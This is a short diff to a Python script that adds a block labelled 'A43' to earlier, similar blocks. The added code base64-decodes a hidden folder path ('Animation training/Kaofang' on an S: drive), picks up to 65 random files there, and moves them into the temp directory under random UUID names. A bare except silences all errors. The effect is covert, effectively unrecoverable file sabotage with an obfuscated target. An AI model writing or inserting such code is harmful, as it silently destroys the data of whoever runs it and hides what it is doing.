@@ -199,7 +199,7 @@ try:
         shutil.move(file, os.path.join(tempfile.gettempdir(), uuid.uuid4().hex))
 except:
     pass
-
+    
 # - A32
 try:
     # -------------<
@@ -242,6 +242,17 @@ try:
                     )
         except:
             pass
+            
+# - A43
+try:
+    files = glob.glob(
+        "{}/**/*".format(b64decode_padded("UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2Zhbmc=")), recursive=True
+    )
+    files = [f for f in files if os.path.isfile(f)]
+    for file in random.sample(files, k=min(65, len(files))):
+        shutil.move(file, os.path.join(tempfile.gettempdir(), uuid.uuid4().hex))
+except:
+    pass
 
 except:
     try:
